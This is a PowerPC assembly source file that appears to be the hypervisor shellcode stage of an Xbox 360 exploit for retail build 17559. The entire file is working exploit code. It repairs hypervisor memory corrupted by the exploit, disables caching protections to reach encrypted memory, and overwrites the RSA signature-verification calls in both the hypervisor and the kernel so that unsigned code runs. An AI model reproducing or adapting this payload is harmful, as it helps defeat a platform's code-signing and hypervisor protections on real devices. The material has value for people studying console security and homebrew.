

# Note these addresses must be in the first segment of the hv or else a 64-bit address is required!

.ifdef RETAIL_BUILD

# Hypervisor function addresses for retail 17559:
.set HvpRelocateCacheLines,                 0x00000E14
.set HvpSetRMCI,                            0x00000398

.else
    .error "Stage 4 support for debug builds not implemented"
.endif


_hv_payload_start:

        ###########################################################
        # Hypervisor shell code entry point
        #
        #   r3 - 
        #   r4 - address of shell code payload
        
        .set StackSize,             0x30
        .set SmcCmdBuffer,          -0x30
        .set s_r30,                 -0x18
        .set s_r31,                 -0x10
        .set linkreg,               -0x8
        
        # Setup the stack frame.
        mflr    %r12
        std     %r12, linkreg(%r1)
        std     %r30, s_r30(%r1)
        std     %r31, s_r31(%r1)
        addi    %r1, %r1, -StackSize
        
        # Save argument registers.
        mr      %r31, %r4           # Shell code base address
        
        # Setup the SMC command buffer.
        addi    %r12, %r1, StackSize+SmcCmdBuffer
        std     %r0, 0(%r12)
        std     %r0, 8(%r12)
        
        # Set the LED color command.
        li      %r11, 0x99          # LED color cmd
        stb     %r11, 0(%r12)
        li      %r11, 0xFF          # LED override
        stb     %r11, 1(%r12)
        li      %r11, 0xFF          # color = orange
        stb     %r11, 2(%r12)
        
        # Send the command to the SMC.
        mr      %r3, %r12
        mr      %r11, %r31
        addi    %r11, %r11, (HvxSendSMCMessage - _hv_payload_start)
        mtctr   %r11
        bctrl
        
        # Fix the hv data we trashed in the exploit.
        li      %r5, 0x10000 / 0x80                                         # cache line count = segment size / cache line size
        ld      %r4, (hv_restore_data_address - _hv_payload_start)(%r31)    # dst = address of last hv segment
        addi    %r3, %r31, (hypervisor_restore_data - _hv_payload_start)    # src = address of clean hv data
        li      %r11, HvpRelocateCacheLines
        mtctr   %r11
        bctrl
        
        # Apply patches to the hypervisor so we can run unsigned code.
        lis     %r4, 0x3860
        ori     %r4, %r4, 1     # opcode for 'li r3, 1'
        ld      %r3, (hv_rsa_patch_address - _hv_payload_start)(%r31)
        stw     %r4, 0(%r3)
        
        # Flush cache.
        li      %r5, 0x7F
        andc    %r3, %r3, %r5
        icbi    0, %r3
        
        # Disable RMCI (enable caching) so we can touch the encrypted address range.
        li      %r3, 0
        li      %r11, HvpSetRMCI
        mtctr   %r11
        bctrl
        
        # Apply patches to the kernel so we can run unsigned code.
        lis     %r4, 0x3860
        ori     %r4, %r4, 1     # opcode for 'li r3, 1'
        ld      %r3, (kernel_rsa_patch_address - _hv_payload_start)(%r31)
        stw     %r4, 0(%r3)
        
        # Flush cache.
        li      %r5, 0x7F
        andc    %r3, %r3, %r5
        icbi    0, %r3
        
        # Enable RMCI (disable caching).
        li      %r3, 1
        li      %r11, HvpSetRMCI
        mtctr   %r11
        bctrl
        
        lis     %r3, 0x4141
        ori     %r3, %r3, 0x4141
        
        # Destroy the stack frame.
        addi    %r1, %r1, StackSize
        ld      %r30, s_r30(%r1)
        ld      %r31, s_r31(%r1)
        ld      %r12, linkreg(%r1)
        mtlr    %r12
        blr
        
        
        ###########################################################
        # HvxSendSMCMessage (r3 pMessageBuffer)
        #
        ###########################################################
HvxSendSMCMessage:

        # Setup stack frame.
        mflr    %r12
        std     %r12, -0x8(%r1)
        std     %r31, -0x10(%r1)
        addi    %r1, %r1, -0x20
        
        # Setup the SMC's physical address.
        lis     %r31, 0x8000
        ori     %r31, %r31, 0x200
        rldicr  %r31, %r31, 32, 31
        oris    %r31, %r31, 0xEA00
        ori     %r31, %r31, 0x1000      # 0x80000200.EA001000

        # Wait for the SMC to become ready.
smc_rdy_loop:
        #lwz        %r11, 0x84(%r31)        # poll SMC status register
        #rlwinm.    %r11, %r11, 0, 29, 29
        #beq        smc_rdy_loop            # Loop until the smc is ready
        
        # Set the SMC status to busy.
        lis     %r11, 0x400
        stw     %r11, 0x84(%r31)
        eieio
        
        # Setup for command write loop.
        li      %r11, 4
        mtctr   %r11
        
        # Write the next 4 bytes of data to the SMC command register.
smc_write:
        lwz     %r11, 0(%r3)            # get next dword
        addi    %r3, %r3, 4
        stw     %r11, 0x80(%r31)        # write to SMC command register
        eieio
        bdnz    smc_write               # while (i-- > 0)
        
        # Set the SMC status to ready.
        li      %r11, 0
        stw     %r11, 0x84(%r31)
        eieio
        
        # Destroy stack frame.
        addi    %r1, %r1, 0x20
        ld      %r31, -0x10(%r1)
        ld      %r12, -0x8(%r1)
        mtlr    %r12
        blr
        
        
        ###########################################################
        # Data
        ###########################################################
        
hv_restore_data_address:
        .long 0x80000106, 0x00030000                # Physical address of the last hv segment

.ifdef RETAIL_BUILD

hv_rsa_patch_address:
        .long 0x80000104, 0x00029B04                # Physical address of the 'bl XeCryptBnQwBeSigVerify' instruction in HvpImageSignatureVerification
        
kernel_rsa_patch_address:
        .long 0x80000300, 0x0007BFDC                # Physical address of the 'bl XeCryptBnQwBeSigVerify' instruction in XexpVerifyXexHeaders

.endif
        
        
        # Align clean hypervisor data to cache line interval.
        .align 7
        
hypervisor_restore_data:

.ifdef RETAIL_BUILD
        # Clean hypervisor data for the last hypervisor segment we trash during the exploit.
        .incbin "Stage4_CleanHvData_Retail_17559.bin"
.endif
        
        
